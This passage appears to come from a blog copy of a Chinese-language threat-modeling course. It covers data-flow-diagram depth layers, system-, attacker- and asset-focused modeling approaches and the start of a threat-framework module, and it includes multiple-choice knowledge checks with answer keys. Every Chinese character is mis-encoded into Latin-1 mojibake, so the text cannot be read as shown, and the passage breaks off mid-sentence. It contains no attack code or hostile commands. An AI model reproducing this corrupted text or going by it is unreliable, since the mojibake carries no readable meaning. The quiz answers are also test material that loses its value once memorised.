æ­¤å±‚çš„æ•°æ®æµå…³ç³»å›¾åŒ…å«å•ç‹¬çš„æ•°æ®æµå…³ç³»å›¾ï¼Œè¿™äº›å…³ç³»å›¾è¯¦ç»†ä»‹ç»æ¯ä¸ªä½çº§åˆ«ç³»ç»Ÿå­éƒ¨åˆ†ã€‚</p><p>ç›®æ ‡ï¼šè¡¨ç¤ºä½çº§åˆ«ç³»ç»Ÿå­éƒ¨åˆ†ï¼ˆå…·æœ‰è¶³å¤Ÿçš„ä¸Šä¸‹æ–‡ï¼‰ï¼Œå¯å¸®åŠ©ä½ äº†è§£å…¶å·¥ä½œåŸç†åŠå½¼æ­¤äº¤äº’æ–¹å¼ã€‚</p><p>ä¸è¿‡ç¨‹å±‚ç›¸ä¼¼ï¼Œç³»ç»Ÿå­è¿‡ç¨‹å±‚ä¸­çš„æ•°æ®æµå…³ç³»å›¾åº”å®¹çº³åœ¨ä¸€ä¸ªé¡µé¢ä¸­ï¼Œå¹¶åŒ…å«å…¶å„è‡ªç³»ç»Ÿå­éƒ¨åˆ†çš„æ‰€æœ‰è¿‡ç¨‹ã€‚</p><div class="note warning"><p>è¯·ä¸ä½ çš„å›¢é˜Ÿæ ¸å¯¹ä»¥ç¡®è®¤æ˜¯å¦éœ€è¦æ­¤æ·±åº¦çº§åˆ«ã€‚</p></div><h4 id="ä½•æ—¶ä½¿ç”¨ä½çº§åˆ«å±‚"><a href="#ä½•æ—¶ä½¿ç”¨ä½çº§åˆ«å±‚" class="headerlink" title="ä½•æ—¶ä½¿ç”¨ä½çº§åˆ«å±‚"></a>ä½•æ—¶ä½¿ç”¨ä½çº§åˆ«å±‚</h4><p>é«˜åº¦å…³é”®çº§åˆ«ç³»ç»Ÿå’Œå†…æ ¸çº§åˆ«çš„ç³»ç»Ÿåº”åœ¨æ­¤å±‚è¿›è¡Œå¨èƒå»ºæ¨¡ã€‚ æ•°æ®æµå…³ç³»å›¾åº”è¯¦ç»†æè¿°æ¯ä¸ªå­è¿‡ç¨‹ã€‚ æ­¤å¤–ï¼Œé€šå¸¸åªä¸ºä¸€ä¸ªå­è¿‡ç¨‹è¿›è¡Œå¤šè½®å®‰å…¨æ£€æŸ¥ã€‚</p><p>æŒ‰ç…§å‰é¢å„å±‚ä¸­çš„æ­¥éª¤æ“ä½œï¼Œå°†æ¯ä¸ªå…³ç³»å›¾è¿½æº¯åˆ°å„è‡ªçš„ç³»ç»Ÿéƒ¨åˆ†ã€‚</p><h3 id="å°ç»“-2"><a href="#å°ç»“-2" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><h4 id="æ‘˜è¦-1"><a href="#æ‘˜è¦-1" class="headerlink" title="æ‘˜è¦"></a>æ‘˜è¦</h4><p>å·¥ç¨‹å¸ˆåˆ©ç”¨å¨èƒå»ºæ¨¡èƒ½å¤Ÿä»¥å›¾å½¢æ–¹å¼å‘ä»–äººæè¿°ç³»ç»Ÿã€‚ å®ƒåˆ›å»ºäº†ä¸€ä¸ªå…±åŒçš„åŸºç¡€ï¼Œå¹¶å®ç°äº†æ›´åŠ é›†ä¸­çš„å®‰å…¨å¯¹è¯ã€‚</p><p>ä½†æ˜¯ï¼Œæ ¹æ®è¦æ„å»ºçš„ç³»ç»Ÿå’Œæ‰€éœ€çš„ä¸Šä¸‹æ–‡ï¼Œå¨èƒæ¨¡å‹å¯èƒ½å˜å¾—å¤ªå¤æ‚æˆ–çº§åˆ«å¤ªé«˜ã€‚</p><p>åœ¨æœ¬æ¨¡å—ä¸­ï¼Œä½ äº†è§£äº†å¦‚ä½•ç¡®å®šé—®é¢˜çš„ä¼˜å…ˆçº§ï¼Œä»¥åŠå¦‚ä½•æ ¹æ®ç±»å‹å’ŒåŠŸèƒ½åº”ç”¨æ°å½“çš„å®‰å…¨æ§åˆ¶å±‚ã€‚</p><p>æœ¬æ¨¡å—æ¶µç›–äº†ä»¥ä¸‹å†…å®¹ï¼š</p><ul><li>äº†è§£äº†æ•°æ®æµå…³ç³»å›¾æ·±åº¦å±‚ä¹‹é—´çš„å·®å¼‚</li><li>äº†è§£äº†ä½•æ—¶ä½¿ç”¨æ¯ä¸ªå±‚</li></ul><div class="note info"><p><strong>ä½ çŸ¥é“å—ï¼Ÿ</strong> é™¤äº†è¿™å››ä¸ªå±‚ä¹‹å¤–ï¼Œä½ è¿˜å¯ä»¥æ ¹æ®ç”¨æˆ·è§’è‰²åˆ›å»ºå…³ç³»å›¾ï¼Œä»¥å¸®åŠ©æ‰¾å‡ºèº«ä»½éªŒè¯å’Œæˆæƒæ–¹é¢çš„ç¼ºé™·ã€‚ æ® <a href="https://owasp.org/www-project-top-ten/">OWASP</a> ç­‰ä¿¡æ¯æºçš„æŠ¥é“ï¼Œè¿™äº›äº‹æ•…æ˜¯ç›®å‰å„ä¸ªç»„ç»‡é¢ä¸´çš„æœ€å¤§å®‰å…¨é—®é¢˜ï¼Œå› æ­¤ï¼Œæ ¹æ®é€‚ç”¨çš„è§’è‰²åº”ç”¨å¨èƒæ¨¡å‹å¯ä»¥å¢å¼ºæ•´ä¸ªç³»ç»Ÿçš„å®‰å…¨æ€§å¹¶å¸®åŠ©ä¿æŠ¤å®¢æˆ·ã€‚</p></div><h4 id="çŸ¥è¯†æ£€æŸ¥-11"><a href="#çŸ¥è¯†æ£€æŸ¥-11" class="headerlink" title="çŸ¥è¯†æ£€æŸ¥"></a>çŸ¥è¯†æ£€æŸ¥</h4><ol><li>ä»¥ä¸‹å“ªæ¡é™ˆè¿°æ¦‚æ‹¬äº†åœ¨å¨èƒå»ºæ¨¡é˜¶æ®µææ—©å®šä¹‰ä¸Šä¸‹æ–‡æ·±åº¦å±‚çš„é‡è¦æ€§</li></ol><div class='checkbox'><input type="radio" />            <p>A. è¿™æ ·æˆ‘å¯ä»¥æ”¶é›†æ‰€æœ‰ä½¿ç”¨çš„å¤–éƒ¨ç»„ä»¶çš„è¯¦ç»†ä¿¡æ¯ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>B. è¿™æ ·åšå¯ä»¥å¸®åŠ©æˆ‘æ ¹æ®è¦æ±‚å’ŒæœŸæœ›ç”Ÿæˆæ°å½“çº§åˆ«çš„ä¸Šä¸‹æ–‡ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>C. è¿™æ ·åšæœ‰åŠ©äºåœ¨è¿›è¡Œå®‰å…¨è¯„å®¡ä¹‹å‰æ‰¾å‡ºæ‰€æœ‰ç›¸å…³å¨èƒã€‚</p>            </div><p>å‚è€ƒç­”æ¡ˆï¼š<psw>== B ==</psw></p><p>è§£é‡Šï¼š<psw>A. è¯¥é™ˆè¿°æè¿°äº†è®¾è®¡é˜¶æ®µçš„ä¸€éƒ¨åˆ†ï¼Œä½†æœªå®šä¹‰ä¸Šä¸‹æ–‡æ·±åº¦å±‚çš„é‡è¦æ€§ã€‚B. æ­¤é™ˆè¿°é˜æ˜äº†åœ¨åˆ›å»ºæ•°æ®æµå…³ç³»å›¾ä¹‹å‰è®¾ç½®é€‚å½“ä¸Šä¸‹æ–‡çº§åˆ«çš„é‡è¦æ€§ã€‚C. æ­¤é™ˆè¿°æè¿°äº†ä¸­æ–­é˜¶æ®µçš„ä¸€éƒ¨åˆ†ï¼Œè¯¥é˜¶æ®µå‘ç”Ÿåœ¨åˆ›å»ºæ•°æ®æµä¹‹åã€‚</psw></p><h2 id="æ¨¡å—4-å¤„ç†æ•°æ®æµå…³ç³»å›¾å…³æ³¨é€‚å½“çš„å¨èƒæ¨¡å‹"><a href="#æ¨¡å—4-å¤„ç†æ•°æ®æµå…³ç³»å›¾å…³æ³¨é€‚å½“çš„å¨èƒæ¨¡å‹" class="headerlink" title="æ¨¡å—4 | å¤„ç†æ•°æ®æµå…³ç³»å›¾å…³æ³¨é€‚å½“çš„å¨èƒæ¨¡å‹"></a>æ¨¡å—4 | å¤„ç†æ•°æ®æµå…³ç³»å›¾å…³æ³¨é€‚å½“çš„å¨èƒæ¨¡å‹</h2><p>å¨èƒå»ºæ¨¡æ˜¯ä¸€ç§æœ‰æ•ˆçš„æŠ€æœ¯ï¼Œå¯å¸®åŠ©ä½ ç¡®å®šå¨èƒä»¥åŠæ‰¾åˆ°é™ä½é£é™©çš„æ–¹æ³•ã€‚ ä½ å¯ä»¥é€‰æ‹©é‡ç‚¹å…³æ³¨å‘ç°éœ€è¦ä¿æŠ¤çš„æ–¹é¢æˆ–è€…æ”»å‡»è€…åœ¨ç³»ç»Ÿä¸­çš„è¡Œä¸ºæ–¹å¼ã€‚</p><h3 id="ç®€ä»‹-1"><a href="#ç®€ä»‹-1" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><h4 id="é‡ç‚¹å…³æ³¨é‡è¦æ–¹é¢"><a href="#é‡ç‚¹å…³æ³¨é‡è¦æ–¹é¢" class="headerlink" title="é‡ç‚¹å…³æ³¨é‡è¦æ–¹é¢"></a>é‡ç‚¹å…³æ³¨é‡è¦æ–¹é¢</h4><p>å…³æ³¨é€‚å½“çš„æ–¹é¢å¯ä»¥å¸®åŠ©ä½ å®šåˆ¶å¨èƒå»ºæ¨¡ç»ƒä¹ ï¼Œä»¥å¾—å‡ºä¼˜ç§€çš„æ•ˆæœã€‚</p><p>ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><ul><li>è®¾è®¡æ–‡ä»¶å…±äº«åº”ç”¨ç¨‹åºï¼Œå¹¶ä¸“æ³¨äºä¿æŠ¤å…¶è¿›ç¨‹ã€æ•°æ®å­˜å‚¨å’Œæ•°æ®æµã€‚</li><li>è®¾è®¡æ–‡ä»¶å…±äº«åº”ç”¨ç¨‹åºï¼Œå¹¶ä¸“æ³¨äºæ·±å…¥äº†è§£æ”»å‡»è€…ã€‚<ul><li>åŒ…æ‹¬æ”»å‡»è€…çš„åŠ¨æœºä»¥åŠå¯èƒ½ç”¨äºæ”»å‡»åº”ç”¨ç¨‹åºçš„æ–¹å¼</li></ul></li></ul><p>åœ¨æ­¤æ¨¡å—ä¸­ï¼Œ<u>ä½ å°†äº†è§£æ‰§è¡Œé’ˆå¯¹ç³»ç»Ÿçš„å¨èƒå»ºæ¨¡ç»ƒä¹ çš„å«ä¹‰</u>ã€‚ è¿˜ä¼šäº†è§£é’ˆå¯¹ç³»ç»Ÿã€èµ„äº§å’Œæ”»å‡»è€…çš„æ–¹æ³•ä¹‹é—´çš„å¤§æ¦‚å·®å¼‚ã€‚</p><h4 id="å­¦ä¹ ç›®æ ‡-3"><a href="#å­¦ä¹ ç›®æ ‡-3" class="headerlink" title="å­¦ä¹ ç›®æ ‡"></a>å­¦ä¹ ç›®æ ‡</h4><p>åœ¨æœ¬æ¨¡å—ä¸­ï¼Œä½ å°†èƒ½å¤Ÿï¼š</p><ul><li>å®šä¹‰é’ˆå¯¹ç³»ç»Ÿçš„å¨èƒå»ºæ¨¡ç»ƒä¹ </li><li>è¯´æ˜é’ˆå¯¹ç³»ç»Ÿã€èµ„äº§å’Œæ”»å‡»è€…çš„æ–¹æ³•ä¹‹é—´çš„å¤§æ¦‚å·®å¼‚</li></ul><div class="note success"><p>æ— å¿…å¤‡çŸ¥è¯†å³å¯å­¦ä¹  ï¼ˆ</p></div><h3 id="å¨èƒå»ºæ¨¡é’ˆå¯¹æ€§æ–¹æ³•"><a href="#å¨èƒå»ºæ¨¡é’ˆå¯¹æ€§æ–¹æ³•" class="headerlink" title="å¨èƒå»ºæ¨¡é’ˆå¯¹æ€§æ–¹æ³•"></a>å¨èƒå»ºæ¨¡é’ˆå¯¹æ€§æ–¹æ³•</h3><p>å¨èƒå»ºæ¨¡æ˜¯ä¸€ç§å¾ˆå¥½çš„æŠ€æœ¯ï¼Œå¯å¸®åŠ©ä½ åœ¨å¼€å‘ç”Ÿå‘½å‘¨æœŸçš„æ›´æ—©é˜¶æ®µå‘ç°é—®é¢˜ã€‚ é€‰æ‹©ä¾§é‡ç‚¹æ°å½“çš„æ–¹æ³•æœ‰åŠ©äºå®šåˆ¶å¨èƒå»ºæ¨¡ç»ƒä¹ ã€‚ ä½ å¯ä»¥å‘ç°æ›´å¤šå¯å¯¹å…¶æ‰§è¡Œæ“ä½œçš„å¨èƒå’Œè§£å†³å¨èƒçš„æ–¹æ³•ã€‚</p><h4 id="ä¾§é‡ç³»ç»Ÿçš„æ–¹æ³•"><a href="#ä¾§é‡ç³»ç»Ÿçš„æ–¹æ³•" class="headerlink" title="ä¾§é‡ç³»ç»Ÿçš„æ–¹æ³•"></a>ä¾§é‡ç³»ç»Ÿçš„æ–¹æ³•</h4><p>ç›®çš„æ˜¯ä¿æŠ¤æ•´ä¸ªç³»ç»Ÿã€‚ å…³æ³¨æ¯ä¸ªè¿‡ç¨‹ã€æ•°æ®å­˜å‚¨ã€æ•°æ®æµã€å¤–éƒ¨å®ä½“å’Œä¿¡ä»»è¾¹ç•Œã€‚ åˆ©ç”¨æ­¤ä¿¡æ¯ï¼Œå¯ç”¨é€‰æ‹©å®‰å…¨æ§åˆ¶æªæ–½æ¥å¸®åŠ©ä¿æŠ¤ç³»ç»Ÿã€‚</p><p>æ­¤æ¡†æ¶æœ‰åŠ©äºåˆ†æç³»ç»ŸåŠå…¶å¯¹å…¶ä»–èµ„äº§çš„å½±å“ï¼Œå…·ä½“åŒ…æ‹¬ï¼š</p><table><thead><tr><th align="left">èµ„äº§ç±»å‹</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left">é€»è¾‘</td><td align="left">æºä»£ç ã€API å’Œé€»è¾‘å®‰å…¨æ§åˆ¶æªæ–½</td></tr><tr><td align="left">ç‰©ç†</td><td align="left">æœåŠ¡å™¨å’Œç‰©ç†å®‰å…¨æ§åˆ¶èµ„äº§</td></tr></tbody></table><h4 id="ä¾§é‡æ”»å‡»è€…çš„æ–¹æ³•"><a href="#ä¾§é‡æ”»å‡»è€…çš„æ–¹æ³•" class="headerlink" title="ä¾§é‡æ”»å‡»è€…çš„æ–¹æ³•"></a>ä¾§é‡æ”»å‡»è€…çš„æ–¹æ³•</h4><p>ä½ å¯ä»¥ç€çœ¼äºæ”»å‡»è€…ã€å…¶åŠ¨æœºã€æ–¹æ³•ï¼Œä»¥åŠä»–ä»¬èƒ½å¤Ÿåœ¨ç³»ç»Ÿä¸­é€ æˆç ´åçš„æ‰€æœ‰æ–¹å¼ã€‚ è¿™ç§æ–¹æ³•å…³æ³¨å…¥å£ç‚¹ï¼Œè€Œä¸æ˜¯æ•´ä¸ªç³»ç»Ÿã€‚</p><p>ä½¿ç”¨æ­¤æ–¹æ³•ï¼Œä½ å¯ä»¥ä¸“æ³¨äºåŒ…å«ç³»ç»Ÿé«˜åº¦æœºå¯†æ•°æ®çš„å…³é”®èµ„äº§ã€‚ é‡ç‚¹æ˜¯ä¿æŠ¤è¿™äº›èµ„äº§ï¼Œè€Œä¸æ˜¯æ•´ä¸ªç³»ç»Ÿã€‚</p><h4 id="ä¾§é‡èµ„äº§çš„æ–¹æ³•"><a href="#ä¾§é‡èµ„äº§çš„æ–¹æ³•" class="headerlink" title="ä¾§é‡èµ„äº§çš„æ–¹æ³•"></a>ä¾§é‡èµ„äº§çš„æ–¹æ³•</h4><p>è¯„ä¼°æ¯é¡¹èµ„äº§çš„é£é™©ã€‚ æ­¤æ–¹æ³•åŸºäºåˆ†ç±»æ•°æ®å¤„ç†ç­‰åŠŸèƒ½ç¡®å®šå…³é”®èµ„äº§ï¼Œä¸»è¦ä¸“æ³¨äºä¿æŠ¤è¿™äº›èµ„äº§ã€‚</p><div class="note info"><p>Microsoft å·¥ç¨‹å¸ˆè‡´åŠ›äºä¿æŠ¤ç³»ç»Ÿã€‚ æ¸—é€æµ‹è¯•å›¢é˜Ÿè‡´åŠ›äºä¿æŠ¤ç³»ç»Ÿå’Œäº†è§£æ”»å‡»è€…ã€‚</p></div><h3 id="é’ˆå¯¹ç³»ç»Ÿçš„å’Œå…¶ä»–æ–¹é¢çš„æ–¹æ³•"><a href="#é’ˆå¯¹ç³»ç»Ÿçš„å’Œå…¶ä»–æ–¹é¢çš„æ–¹æ³•" class="headerlink" title="é’ˆå¯¹ç³»ç»Ÿçš„å’Œå…¶ä»–æ–¹é¢çš„æ–¹æ³•"></a>é’ˆå¯¹ç³»ç»Ÿçš„å’Œå…¶ä»–æ–¹é¢çš„æ–¹æ³•</h3><h4 id="ä¾§é‡ç³»ç»Ÿçš„æ–¹æ³•çš„é‡è¦æ€§"><a href="#ä¾§é‡ç³»ç»Ÿçš„æ–¹æ³•çš„é‡è¦æ€§" class="headerlink" title="ä¾§é‡ç³»ç»Ÿçš„æ–¹æ³•çš„é‡è¦æ€§"></a>ä¾§é‡ç³»ç»Ÿçš„æ–¹æ³•çš„é‡è¦æ€§</h4><p>ä½¿ç”¨ Azure å¯¹ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯æ˜¯å¾ˆå¥½çš„åšæ³•ã€‚ äº†è§£å®ƒçš„å·¥ä½œåŸç†ï¼Œäº†è§£å®ƒæ˜¯å¦‚ä½•ä¸ç³»ç»Ÿçš„æ¯ä¸ªéƒ¨åˆ†è¿›è¡Œäº¤äº’ï¼Œå¯ä»¥æ›´å¥½åœ°é¿å…äº§ç”Ÿå®ç°éƒ¨ç½²åçš„æœªçŸ¥é£é™©ã€‚</p><p>æ¯•ç«Ÿï¼Œå¨èƒå»ºæ¨¡çš„ç›®æ ‡æ˜¯éªŒè¯ä¹‹å‰åšå‡ºçš„å‡è®¾ï¼Œç¡®å®šæ½œåœ¨çš„å¨èƒï¼Œå¹¶åœ¨å¼€å‘ç”Ÿå‘½å‘¨æœŸä¸­æ›´æ—©åœ°é™ä½é£é™©ã€‚</p><p>ä¾§é‡ç³»ç»Ÿçš„æ–¹æ³•çš„å®è·µç¤ºä¾‹</p><p>è®©æˆ‘ä»¬ä»¥æ–‡ä»¶å…±äº«åº”ç”¨ç¨‹åºä¸ºä¾‹ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒæŸ¥çœ‹æ•°æ®æµå…³ç³»å›¾æ—¶ï¼Œå¯èƒ½ä¼šçœ‹åˆ°ä»¥ä¸‹æµï¼š</p><ul><li>ç”¨æˆ·è¯·æ±‚è®¿é—®åº”ç”¨ç¨‹åº</li><li>èº«ä»½éªŒè¯æµå¯åŠ¨</li><li>ç”¨æˆ·ä¸å…¶ä»–ç”¨æˆ·å…±äº«æ–‡ä»¶</li></ul><p>æ­¤æ–¹æ³•åˆ†æå¹¶ä¿æŠ¤æ¯ä¸ªå…ƒç´ ï¼Œ ä¾‹å¦‚ç”¨æˆ·ã€Web æœåŠ¡ã€èº«ä»½éªŒè¯æœåŠ¡ã€æ•°æ®å­˜å‚¨ã€Internet ä¸ Azure ä¹‹é—´çš„ä¿¡ä»»è¾¹ç•Œä»¥åŠæ•°æ®æµã€‚</p><div class="note info"><p>é’ˆå¯¹ç³»ç»Ÿçš„æ–¹æ³•åŒ…å«å…¶ä»–ä¸€äº›æ–¹æ³•ï¼Œä½†å¯èƒ½éœ€è¦ä¸€ä¸€è¯•ç”¨æ‰èƒ½è·å¾—æ›´ç²¾ç»†çš„æ•ˆæœã€‚</p></div><h4 id="çŸ¥è¯†æ£€æŸ¥-12"><a href="#çŸ¥è¯†æ£€æŸ¥-12" class="headerlink" title="çŸ¥è¯†æ£€æŸ¥"></a>çŸ¥è¯†æ£€æŸ¥</h4><ol><li>é’ˆå¯¹ç³»ç»Ÿçš„æ–¹æ³•æœ‰ä»€ä¹ˆå¥½å¤„ï¼Ÿ</li></ol><div class='checkbox'><input type="radio" />            <p>A. ä½¿ç”¨æ­¤æ–¹æ³•ï¼Œä½ å¯ä»¥ä¸€æ¬¡ä¸“æ³¨ä¸€ä¸ªå…³é”®èµ„äº§ï¼Œä»¥å¸®åŠ©ç¡®å®šæ‰€æœ‰æ½œåœ¨å¨èƒä»¥åŠé™ä½æˆ–æ¶ˆé™¤é£é™©çš„æ–¹æ³•ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>B. æ­¤æ–¹æ³•å¯æä¾›æ½œåœ¨æ”»å‡»è€…çš„ä¿¡æ¯ï¼Œå…¶ä¸­åŒ…æ‹¬å…¶æ‰‹æ®µã€åŠ¨æœºå’Œè¡ŒåŠ¨è®¡åˆ’ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>C. æ­¤æ–¹æ³•å¯è®©ä½ ä¸“æ³¨äºæ”¹è¿›ç³»ç»Ÿå¤„ç†ç”¨æˆ·å’Œæ•°æ®çš„æ–¹æ³•ã€‚ å®ƒè¿˜ä¼šéªŒè¯å…³äºé€šè¿‡æœåŠ¡ä½¿ç”¨çš„ç‰©ç†å’Œé€»è¾‘èµ„äº§çš„å®‰å…¨å‡è®¾ã€‚</p>            </div><ol start="2"><li>é’ˆå¯¹æ”»å‡»è€…çš„æ–¹æ³•æœ‰ä»€ä¹ˆå¥½å¤„ï¼Ÿ</li></ol><div class='checkbox'><input type="radio" />            <p>A. ä½¿ç”¨æ­¤æ–¹æ³•ï¼Œä½ å¯ä»¥ä¸€æ¬¡ä¸“æ³¨ä¸€ä¸ªå…³é”®èµ„äº§ï¼Œä»¥è¯†åˆ«æ‰€æœ‰æ½œåœ¨å¨èƒä»¥åŠé™ä½é£é™©çš„æ–¹æ³•ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>B. æ­¤æ–¹æ³•å¯æä¾›æ½œåœ¨æ”»å‡»è€…çš„ä¿¡æ¯ï¼Œå…¶ä¸­åŒ…æ‹¬å…¶æ‰‹æ®µã€åŠ¨æœºå’Œè¡ŒåŠ¨è®¡åˆ’ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>C. æ­¤æ–¹æ³•å¯è®©ä½ ä¸“æ³¨äºæ”¹è¿›ç³»ç»Ÿå¤„ç†ç”¨æˆ·å’Œæ•°æ®çš„æ–¹æ³•ã€‚ å®ƒè¿˜ä¼šéªŒè¯å…³äºé€šè¿‡æœåŠ¡ä½¿ç”¨çš„ç‰©ç†å’Œé€»è¾‘èµ„äº§çš„å®‰å…¨å‡è®¾ã€‚</p>            </div><p>å‚è€ƒç­”æ¡ˆï¼š</p><ol><li><psw>== C ==</psw></li><li><psw>== B ==</psw></li></ol><p>è§£é‡Šï¼š</p><ol><li><psw>A. æ­¤æ¡ç›®å¯¹åº”äºé’ˆå¯¹èµ„äº§çš„æ–¹æ³•ã€‚B. æ­¤æ¡ç›®å¯¹åº”äºé’ˆå¯¹æ”»å‡»è€…çš„æ–¹æ³•ã€‚C. é’ˆå¯¹ç³»ç»Ÿçš„æ–¹æ³•è€ƒå¯Ÿæ•´ä¸ªç³»ç»Ÿï¼Œè€Œä¸ä»…ä»…æ˜¯å…¶ä¸­çš„æŸäº›éƒ¨åˆ†ã€‚</psw></li><li><psw>A. æ­¤æ¡ç›®å¯¹åº”äºé’ˆå¯¹èµ„äº§çš„æ–¹æ³•ã€‚B. é’ˆå¯¹æ”»å‡»è€…çš„æ–¹æ³•åŸºäºæ”»å‡»è€…åŠå…¶æ”»å‡»è®¡åˆ’ã€‚C. æ­¤æ¡ç›®æè¿°é’ˆå¯¹ç³»ç»Ÿçš„æ–¹æ³•ã€‚</psw></li></ol><h3 id="å°ç»“-3"><a href="#å°ç»“-3" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><p>å¨èƒå»ºæ¨¡æ˜¯ä¸€ç§æœ‰æ•ˆçš„æŠ€æœ¯ï¼Œå¯å¸®åŠ©ä½ ç¡®å®šå¨èƒä»¥åŠé™ä½æˆ–æ¶ˆé™¤é£é™©çš„æ–¹æ³•ã€‚ ä½ å¯ä»¥ä¾§é‡äºå‘ç°éœ€è¦ä¿æŠ¤çš„æ–¹é¢æˆ–è€…æ”»å‡»è€…åœ¨ç³»ç»Ÿä¸­çš„è¡Œä¸ºæ–¹å¼ã€‚</p><p>ä½ äº†è§£äº†æ‰§è¡Œé’ˆå¯¹ç³»ç»Ÿçš„å¨èƒå»ºæ¨¡ç»ƒä¹ çš„å«ä¹‰ã€‚ è¿˜äº†è§£äº†é’ˆå¯¹ç³»ç»Ÿã€èµ„äº§å’Œæ”»å‡»è€…çš„æ–¹æ³•ä¹‹é—´çš„å·®å¼‚ã€‚</p><p>åœ¨æœ¬æ¨¡å—ä¸­ï¼Œä½ å·²ç»å­¦ä¹ äº†ä»¥ä¸‹å†…å®¹ï¼š</p><ul><li>å®šä¹‰äº†é’ˆå¯¹ç³»ç»Ÿçš„å¨èƒå»ºæ¨¡ç»ƒä¹ </li><li>è¯´æ˜äº†é’ˆå¯¹ç³»ç»Ÿã€èµ„äº§å’Œæ”»å‡»è€…çš„æ–¹æ³•ä¹‹é—´çš„å¤§æ¦‚å·®å¼‚</li></ul><h2 id="æ¨¡å—5-ä½¿ç”¨æ¡†æ¶è¯†åˆ«å¨èƒå¹¶æ‰¾åˆ°å‡å°‘æˆ–æ¶ˆé™¤é£é™©çš„æ–¹æ³•"><a href="#æ¨¡å—5-ä½¿ç”¨æ¡†æ¶è¯†åˆ«å¨èƒå¹¶æ‰¾åˆ°å‡å°‘æˆ–æ¶ˆé™¤é£é™©çš„æ–¹æ³•" class="headerlink" title="æ¨¡å—5 | ä½¿ç”¨æ¡†æ¶è¯†åˆ«å¨èƒå¹¶æ‰¾åˆ°å‡å°‘æˆ–æ¶ˆé™¤é£é™©çš„æ–¹æ³•"></a>æ¨¡å—5 | ä½¿ç”¨æ¡†æ¶è¯†åˆ«å¨èƒå¹¶æ‰¾åˆ°å‡å°‘æˆ–æ¶ˆé™¤é£é™©çš„æ–¹æ³•</h2><h3 id="ä»‹ç»-1"><a href="#ä»‹ç»-1" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>å¨èƒå»ºæ¨¡æ¡†æ¶å¯å¸®åŠ©ä½ ç”Ÿæˆæ½œåœ¨å¨èƒçš„åˆ—è¡¨ï¼Œå¹¶æ‰¾åˆ°é™ä½æˆ–æ¶ˆé™¤é£é™©çš„æ–¹æ³•ã€‚</p><p>ä½ åªéœ€å…·å¤‡ä¿¡æ¯å®‰å…¨æ–¹é¢çš„åº”ç”¨çŸ¥è¯†ï¼Œæ¡†æ¶å°±å¯ä¸ºä½ åˆ—å‡ºå¨èƒçš„ä¸»è¦ç±»åˆ«ï¼Œä»¥ç¡®ä¿å®ƒä»¬å¾—åˆ°é€‚å½“çš„å¤„ç†ã€‚</p><h4 id="ä½•æ—¶ä½¿ç”¨æ¡†æ¶"><a href="#ä½•æ—¶ä½¿ç”¨æ¡†æ¶" class="headerlink" title="ä½•æ—¶ä½¿ç”¨æ¡†æ¶"></a>ä½•æ—¶ä½¿ç”¨æ¡†æ¶</h4><p>æ­¤æ¡†æ¶åº”é€‚ç”¨äºä¸ºæ–°ç³»ç»Ÿæˆ–ç°æœ‰ç³»ç»Ÿåˆ›å»ºçš„æ¯ä¸ªæ•°æ®æµå…³ç³»å›¾ã€‚</p><div class="note info"><p>ç›®çš„æ˜¯åœ¨å¼€å‘ç”Ÿå‘½å‘¨æœŸçš„æ—©æœŸå°½å¯èƒ½å¤šåœ°å‘ç°å¹¶ä¿®å¤é—®é¢˜ã€‚ ç­‰å¾…æ—¶é—´è¶Šé•¿ï¼Œå®¢æˆ·çš„é£é™©å°±è¶Šé«˜ã€‚</p></div><h4 id="é¢„æœŸç»“æœ"><a href="#é¢„æœŸç»“æœ" class="headerlink" title="é¢„æœŸç»“æœ"></a>é¢„æœŸç»“æœ</h4><p>æ¡†æ¶å°†ä¸ºä½ å‘ˆç°å…­ä¸ªä¸»è¦å¨èƒç±»åˆ«ï¼Œæ¯ä¸ªç±»åˆ«ä¸‹æœ‰æ— æ•°ä¸ªæ½œåœ¨å¨èƒã€‚</p><p>é€šè¿‡è¯¥æ¡†æ¶ï¼Œä½ å°†èƒ½å¤Ÿå›ç­”ä»¥ä¸‹é—®é¢˜ï¼š</p><ul><li>é€šä¿¡çš„åŒæ–¹æ˜¯å¦éƒ½é€šè¿‡äº†èº«ä»½éªŒè¯ï¼Ÿ</li><li>å¦‚ä½•å¾—çŸ¥æŸäººæ— æ³•æ›´æ”¹ä¼ è¾“ä¸­çš„æ•°æ®ã€æ­£åœ¨ä½¿ç”¨çš„æ•°æ®æˆ–é™æ€æ•°æ®ï¼Ÿ</li><li>æ¯ä¸ªæ“ä½œæ˜¯å¦å¯ä»¥ç»‘å®šåˆ°æ ‡è¯†ï¼Ÿ</li><li>å¦‚ä½•å¾—çŸ¥æŸäººæ— æ³•çœ‹åˆ°ä¼ è¾“ä¸­çš„æ•°æ®ã€æ­£åœ¨ä½¿ç”¨çš„æ•°æ®æˆ–é™æ€æ•°æ®ï¼Ÿ</li><li>ç³»ç»Ÿä¸­æ˜¯å¦å­˜åœ¨èµ„æºå—é™çš„åŒºåŸŸï¼Ÿ</li><li>å¦‚ä½•å¾—çŸ¥æŸäººå¯ä»¥æ‰§è¡Œæ­¤æ“ä½œï¼Ÿ</li></ul><p>åœ¨æœ¬æ¨¡å—ä¸­ï¼Œä½ å°†äº†è§£æ¯ç§å¨èƒç±»åˆ«åŠå…¶ç›¸åº”çš„å®‰å…¨æ§åˆ¶ã€‚</p><h4 id="å­¦ä¹ ç›®æ ‡-4"><a href="#å­¦ä¹ ç›®æ ‡-4" class="headerlink" title="å­¦ä¹ ç›®æ ‡"></a>å­¦ä¹ ç›®æ ‡</h4><p>åœ¨æœ¬æ¨¡å—ä¸­ï¼Œä½ 